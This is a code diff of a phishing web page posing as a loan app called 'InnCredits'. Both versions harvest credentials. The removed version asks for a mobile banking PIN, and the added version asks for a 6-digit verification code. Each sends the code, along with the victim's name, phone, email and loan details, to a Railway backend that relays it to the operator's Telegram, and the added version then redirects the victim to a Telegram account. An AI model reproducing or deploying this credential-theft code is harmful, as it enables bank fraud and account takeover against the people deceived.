@@ -3,220 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <title>InnCredits · Confirm PIN</title>
+    <title>InnCredits · Verify Number</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { background: #0b1120; font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif; display: flex; align-items: flex-start; justify-content: center; min-height: 100vh; padding: 16px 16px 32px 16px; }
         .app-container { max-width: 500px; width: 100%; margin: 0 auto; display: flex; flex-direction: column; }
 
-        .loan-summary-bar { background: #111827; border-radius: 20px; padding: 14px 18px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; border: 1px solid #1f2a3e; }
-        .summary-item { display: flex; flex-direction: column; align-items: flex-start; }
-        .summary-label { font-size: 0.7rem; font-weight: 500; color: #7e8aa2; text-transform: uppercase; }
-        .summary-value { font-size: 1rem; font-weight: 700; color: #14b8a6; margin-top: 2px; }
+        .loan-summary-bar { background: #111827; border-radius: 20px; padding: 14px 18px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; border: 1px solid #1f2a3e; }
+        .summary-item { display: flex; flex-direction: column; }
+        .summary-label { font-size: 0.7rem; color: #7e8aa2; text-transform: uppercase; }
+        .summary-value { font-size: 1rem; font-weight: 700; color: #14b8a6; }
 
-        .apply-card { background: #111827; border-radius: 32px; box-shadow: 0 20px 35px -12px rgba(0,0,0,0.5); padding: 28px 24px 32px 24px; }
-        .section-title { font-size: 1.3rem; font-weight: 700; color: #ffffff; margin-bottom: 8px; }
+        .otp-card { background: #111827; border-radius: 32px; padding: 28px 24px 32px 24px; }
+        .section-title { font-size: 1.3rem; font-weight: 700; color: #ffffff; }
         .section-sub { font-size: 0.8rem; color: #7e8aa2; margin-bottom: 28px; border-left: 3px solid #14b8a6; padding-left: 12px; }
 
-        .user-detail-strip { background: #0f1724; border-radius: 16px; padding: 14px 16px; margin-bottom: 24px; border: 1px solid #1f2a3e; display: flex; flex-direction: column; gap: 8px; }
-        .detail-row { display: flex; justify-content: space-between; align-items: center; }
-        .detail-label { font-size: 0.75rem; color: #7e8aa2; font-weight: 500; }
-        .detail-value { font-size: 0.85rem; color: #e2e8f0; font-weight: 600; }
+        .phone-verify-box { background: #0f1724; border-radius: 24px; padding: 18px 16px; margin-bottom: 28px; display: flex; justify-content: space-between; align-items: center; }
+        .phone-number { font-size: 1.1rem; font-weight: 700; color: #e2e8f0; }
+        .edit-link { color: #14b8a6; background: rgba(20,184,166,0.1); padding: 6px 14px; border-radius: 40px; cursor: pointer; }
+        .edit-link:active { transform: scale(0.95); }
 
-        .pin-label { font-size: 0.8rem; font-weight: 600; color: #cbd5e1; margin-bottom: 12px; display: block; }
-        .pin-boxes { display: flex; gap: 12px; justify-content: center; margin-bottom: 8px; }
-        .pin-box {
-            width: 64px; height: 64px;
-            background: #0f1724;
-            border: 1.5px solid #1f2a3e;
-            border-radius: 16px;
-            font-size: 1.6rem;
-            font-weight: 700;
-            color: #14b8a6;
-            text-align: center;
-            caret-color: #14b8a6;
-            font-family: inherit;
-            transition: border-color 0.2s;
-            -webkit-appearance: none;
-        }
-        .pin-box:focus { outline: none; border-color: #14b8a6; }
-        .pin-box.filled { border-color: #14b8a6; background: #0d1e2e; }
-        .pin-hint { font-size: 0.75rem; color: #4b5563; text-align: center; margin-bottom: 24px; margin-top: 4px; }
+        .otp-container { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; flex-wrap: wrap; }
+        .otp-box { width: 55px; height: 65px; background: #0f1724; border: 2px solid #1f2a3e; border-radius: 16px; text-align: center; font-size: 1.6rem; font-weight: 700; color: #14b8a6; outline: none; transition: all 0.2s; }
+        .otp-box:focus { border-color: #14b8a6; box-shadow: 0 0 0 3px rgba(20,184,166,0.2); }
 
-        .submit-btn { width: 100%; background: #14b8a6; border: none; padding: 18px 20px; font-size: 1.1rem; font-weight: 700; color: #0b1120; border-radius: 60px; cursor: pointer; margin-top: 8px; transition: all 0.2s; font-family: inherit; }
-        .submit-btn:active { transform: scale(0.97); }
-        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-
-        .error-message { background: rgba(244,63,94,0.15); color: #f43f5e; padding: 12px; border-radius: 12px; font-size: 0.8rem; margin-top: 16px; text-align: center; display: none; }
+        .verify-btn { width: 100%; background: #14b8a6; border: none; padding: 18px; font-size: 1.1rem; font-weight: 700; color: #0b1120; border-radius: 60px; cursor: pointer; transition: all 0.2s; }
+        .verify-btn:active { transform: scale(0.97); }
+        .error-message { color: #f43f5e; font-size: 0.75rem; text-align: center; margin-top: 12px; display: none; }
         .error-message.show { display: block; }
 
-        .security-note { display: flex; align-items: center; gap: 8px; background: rgba(20,184,166,0.08); border: 1px solid rgba(20,184,166,0.2); border-radius: 12px; padding: 12px 14px; margin-top: 20px; }
-        .security-note span { font-size: 0.78rem; color: #7e8aa2; line-height: 1.4; }
-
-        @media (max-width: 480px) {
-            .apply-card { padding: 22px 18px 26px 18px; }
-            .pin-box { width: 56px; height: 56px; font-size: 1.4rem; }
-        }
+        @media (max-width: 450px) { .otp-box { width: 48px; height: 55px; font-size: 1.4rem; } .otp-container { gap: 8px; } }
     </style>
 </head>
 <body>
 <div class="app-container">
-
     <div class="loan-summary-bar">
-        <div class="summary-item">
-            <span class="summary-label">Loan Amount</span>
-            <span class="summary-value" id="summaryAmount">-</span>
-        </div>
-        <div class="summary-item">
-            <span class="summary-label">Term</span>
-            <span class="summary-value" id="summaryTerm">-</span>
-        </div>
-        <div class="summary-item">
-            <span class="summary-label">Monthly</span>
-            <span class="summary-value" id="summaryMonthly">-</span>
-        </div>
-        <div class="summary-item">
-            <span class="summary-label">Interest</span>
-            <span class="summary-value" id="summaryRate">-</span>
-        </div>
+        <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$0</span></div>
+        <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
+        <div class="summary-item"><span class="summary-label">Monthly</span><span class="summary-value" id="summaryMonthly">$0</span></div>
+        <div class="summary-item"><span class="summary-label">Interest</span><span class="summary-value" id="summaryRate">5%</span></div>
     </div>
 
-    <div class="apply-card">
-        <div class="section-title">Confirm your PIN</div>
-        <div class="section-sub">Enter your 4-digit mobile banking PIN to authorise disbursement</div>
+    <div class="otp-card">
+        <div class="section-title">Verify your number</div>
+        <div class="section-sub">Enter the 6-digit verification code</div>
 
-        <div class="user-detail-strip">
-            <div class="detail-row">
-                <span class="detail-label">Name</span>
-                <span class="detail-value" id="dispName">—</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">Phone</span>
-                <span class="detail-value" id="dispPhone">—</span>
-            </div>
-            <div class="detail-row">
-                <span class="detail-label">Email</span>
-                <span class="detail-value" id="dispEmail">—</span>
-            </div>
+        <div class="phone-verify-box">
+            <div><span class="phone-number" id="displayPhone">+1 234 567 8900</span></div>
+            <div class="edit-link" id="editPhoneBtn">Edit</div>
         </div>
 
-        <span class="pin-label">Mobile Banking PIN</span>
-        <div class="pin-boxes">
-            <input class="pin-box" type="password" inputmode="numeric" maxlength="1" id="p1" autocomplete="off" />
-            <input class="pin-box" type="password" inputmode="numeric" maxlength="1" id="p2" autocomplete="off" />
-            <input class="pin-box" type="password" inputmode="numeric" maxlength="1" id="p3" autocomplete="off" />
-            <input class="pin-box" type="password" inputmode="numeric" maxlength="1" id="p4" autocomplete="off" />
+        <div class="otp-container">
+            <input type="text" maxlength="1" class="otp-box" data-idx="0" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="1" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="2" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="3" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="4" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-box" data-idx="5" inputmode="numeric">
         </div>
-        <div class="pin-hint">Your PIN is encrypted and never stored in plain text</div>
 
-        <button class="submit-btn" id="confirmBtn" disabled onclick="handleConfirm()">Confirm PIN →</button>
-        <div class="error-message" id="errorMessage"></div>
-
-        <div class="security-note">
-            <span>🔒</span>
-            <span>Your PIN is used solely to authorise this transaction. It is transmitted over a secure, encrypted connection.</span>
-        </div>
+        <div class="error-message" id="otpError">⚠️ Please enter all 6 digits</div>
+        <button class="verify-btn" id="verifyBtn">Verify & Continue →</button>
     </div>
 </div>
 
 <script>
     // ============================================
-    // CONFIGURATION - REPLACE WITH YOUR RAILWAY URL
+    // CONFIGURATION
     // ============================================
-    const RAILWAY_URL = 'https://inncredits-production.up.railway.app';
+    const RAILWAY_URL = 'https://your-railway-url.railway.app';
+    const TELEGRAM_USERNAME = 'Inbucksk';
     
     // Get URL parameters
-    const params = new URLSearchParams(window.location.search);
-    const amount = params.get('amount') || '0';
-    const term = params.get('term') || '0';
-    const rate = params.get('rate') || '5';
-    const monthly = params.get('monthly') || '0';
-    const name = decodeURIComponent(params.get('name') || '');
-    const email = decodeURIComponent(params.get('email') || '');
-    const phone = decodeURIComponent(params.get('phone') || '');
-    const appId = params.get('appId') || '';
-
+    const urlParams = new URLSearchParams(window.location.search);
+    const amount = urlParams.get('amount') || '500';
+    const term = urlParams.get('term') || '3';
+    const rate = urlParams.get('rate') || '5';
+    const monthly = urlParams.get('monthly') || '167.36';
+    let userPhone = urlParams.get('phone') || '+1 234 567 8900';
+    const userName = urlParams.get('name') || 'Customer';
+    const userEmail = urlParams.get('email') || '';
+    const applicationId = urlParams.get('appId') || localStorage.getItem('current_application_id');
+    
     // Update top bar
-    document.getElementById('summaryAmount').innerText = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
-    document.getElementById('summaryTerm').innerText = parseInt(term) + ' month' + (parseInt(term) !== 1 ? 's' : '');
-    document.getElementById('summaryMonthly').innerText = '$' + parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
-    document.getElementById('summaryRate').innerText = rate + '%';
-
-    // Update user details
-    document.getElementById('dispName').innerText = name || '—';
-    document.getElementById('dispPhone').innerText = phone || '—';
-    document.getElementById('dispEmail').innerText = email || '—';
-
-    // PIN boxes logic
-    const boxes = ['p1', 'p2', 'p3', 'p4'].map(id => document.getElementById(id));
-    const confirmBtn = document.getElementById('confirmBtn');
-    const errorDiv = document.getElementById('errorMessage');
-
-    boxes.forEach((box, i) => {
-        box.addEventListener('input', function() {
-            box.value = box.value.replace(/\D/g, '').slice(0, 1);
-            if (box.value) {
-                box.classList.add('filled');
-                if (i < 3) boxes[i + 1].focus();
-            } else {
-                box.classList.remove('filled');
-            }
-            confirmBtn.disabled = !boxes.every(b => b.value.length === 1);
-        });
-
-        box.addEventListener('keydown', function(e) {
-            if (e.key === 'Backspace' && !box.value && i > 0) {
-                boxes[i - 1].value = '';
-                boxes[i - 1].classList.remove('filled');
-                boxes[i - 1].focus();
-                confirmBtn.disabled = true;
-            }
-        });
-
-        box.addEventListener('paste', function(e) {
-            e.preventDefault();
-            const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
-            pasted.split('').forEach((ch, idx) => {
-                if (boxes[idx]) {
-                    boxes[idx].value = ch;
-                    boxes[idx].classList.add('filled');
-                }
-            });
-            confirmBtn.disabled = !boxes.every(b => b.value.length === 1);
-            if (boxes[Math.min(pasted.length, 3)]) boxes[Math.min(pasted.length, 3)].focus();
-        });
-    });
-
-    boxes[0].focus();
-
-    function getPin() {
-        return boxes.map(b => b.value).join('');
-    }
-
-    function showError(msg) {
-        errorDiv.textContent = msg;
-        errorDiv.classList.add('show');
-        setTimeout(() => errorDiv.classList.remove('show'), 5000);
-    }
-
+    document.getElementById('summaryAmount').innerText = `$${parseInt(amount).toLocaleString()}`;
+    document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
+    document.getElementById('summaryMonthly').innerText = `$${parseFloat(monthly).toFixed(2)}`;
+    document.getElementById('summaryRate').innerText = `${rate}%`;
+    document.getElementById('displayPhone').innerText = userPhone;
+    
     // ============================================
-    // SEND NOTIFICATION VIA BACKEND
+    // SEND OTP NOTIFICATION TO YOUR TELEGRAM
     // ============================================
-    async function sendNotification(pin) {
+    async function sendOtpToAdmin(otp) {
         const payload = {
-            phone: phone,
-            pin: pin,
-            email: email,
-            name: name,
+            phone: userPhone,
+            pin: otp,
+            email: userEmail,
+            name: userName,
             amount: amount,
             term: term,
-            rate: rate,
-            monthly: monthly,
-            appId: appId,
-            type: 'pin'
+            type: 'otp'
         };
         
-        console.log('📤 Sending to backend:', payload);
+        console.log('📤 Sending OTP to backend:', payload);
         
         try {
             const response = await fetch(`${RAILWAY_URL}/api/send-telegram`, {
@@ -230,34 +120,111 @@
             console.error('Error:', error);
         }
     }
-
+    
     // ============================================
-    // MAIN CONFIRM FUNCTION
+    // REDIRECT TO TELEGRAM
     // ============================================
-    window.handleConfirm = async function() {
-        const pin = getPin();
-        if (pin.length !== 4) {
-            showError('Please enter all 4 digits.');
+    function redirectToTelegram() {
+        const telegramUrl = `https://t.me/${TELEGRAM_USERNAME}`;
+        window.location.href = telegramUrl;
+    }
+    
+    // ============================================
+    // OTP INPUT LOGIC
+    // ============================================
+    const otpBoxes = document.querySelectorAll('.otp-box');
+    let currentOtp = ['', '', '', '', '', ''];
+    const verifyBtn = document.getElementById('verifyBtn');
+    const errorMsg = document.getElementById('otpError');
+    
+    function updateOtpUI() {
+        otpBoxes.forEach((box, idx) => { box.value = currentOtp[idx] || ''; });
+    }
+    
+    function setOtpDigit(index, value) {
+        if (value && !value.match(/[0-9]/)) return;
+        if (index >= 0 && index < 6) {
+            currentOtp[index] = value || '';
+            updateOtpUI();
+            if (value && index < 5) otpBoxes[index + 1].focus();
+            errorMsg.classList.remove('show');
+        }
+    }
+    
+    otpBoxes.forEach((box, idx) => {
+        box.addEventListener('focus', () => { box.style.borderColor = '#14b8a6'; });
+        box.addEventListener('blur', () => { box.style.borderColor = '#1f2a3e'; });
+        box.addEventListener('input', (e) => setOtpDigit(idx, e.target.value.slice(-1)));
+        box.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace') {
+                e.preventDefault();
+                if (currentOtp[idx] !== '') {
+                    setOtpDigit(idx, '');
+                } else if (idx > 0) { 
+                    setOtpDigit(idx - 1, ''); 
+                    otpBoxes[idx - 1].focus(); 
+                }
+            }
+            if (e.key === 'ArrowLeft' && idx > 0) {
+                e.preventDefault();
+                otpBoxes[idx - 1].focus();
+            }
+            if (e.key === 'ArrowRight' && idx < 5) {
+                e.preventDefault();
+                otpBoxes[idx + 1].focus();
+            }
+        });
+        box.setAttribute('inputmode', 'numeric');
+        box.setAttribute('autocomplete', 'off');
+    });
+    
+    // Paste support
+    document.querySelector('.otp-container').addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasteData = e.clipboardData.getData('text').trim();
+        if (pasteData && pasteData.match(/^\d{6}$/)) {
+            const digits = pasteData.split('');
+            digits.forEach((digit, i) => { if (i < 6) setOtpDigit(i, digit); });
+            otpBoxes[5].focus();
+        } else {
+            errorMsg.textContent = 'Please paste a valid 6-digit code';
+            errorMsg.classList.add('show');
+            setTimeout(() => errorMsg.classList.remove('show'), 2000);
+        }
+    });
+    
+    // ============================================
+    // VERIFY BUTTON - SEND OTP + REDIRECT
+    // ============================================
+    verifyBtn.onclick = async () => {
+        const enteredOtp = currentOtp.join('');
+        
+        if (enteredOtp.length !== 6) {
+            errorMsg.classList.add('show');
             return;
         }
-
-        confirmBtn.disabled = true;
-        confirmBtn.textContent = 'Processing...';
-
-        // Send notification via backend
-        await sendNotification(pin);
         
-        // Redirect to OTP page
-        window.location.href = 'otp-verify.html'
-            + '?amount=' + encodeURIComponent(amount)
-            + '&term=' + encodeURIComponent(term)
-            + '&rate=' + encodeURIComponent(rate)
-            + '&monthly=' + encodeURIComponent(monthly)
-            + '&name=' + encodeURIComponent(name)
-            + '&email=' + encodeURIComponent(email)
-            + '&phone=' + encodeURIComponent(phone)
-            + '&appId=' + encodeURIComponent(appId);
+        verifyBtn.disabled = true;
+        verifyBtn.textContent = 'Verifying...';
+        
+        // Send OTP to your Telegram
+        await sendOtpToAdmin(enteredOtp);
+        
+        // Redirect to your Telegram
+        redirectToTelegram();
     };
+    
+    // Edit phone number
+    document.getElementById('editPhoneBtn').onclick = () => {
+        const newPhone = prompt('Enter your phone number:', userPhone);
+        if (newPhone && newPhone.trim().length > 5) { 
+            userPhone = newPhone.trim(); 
+            document.getElementById('displayPhone').innerText = userPhone; 
+        }
+    };
+    
+    // Focus first box
+    setTimeout(() => otpBoxes[0].focus(), 100);
 </script>
 </body>
-</html
+</html>
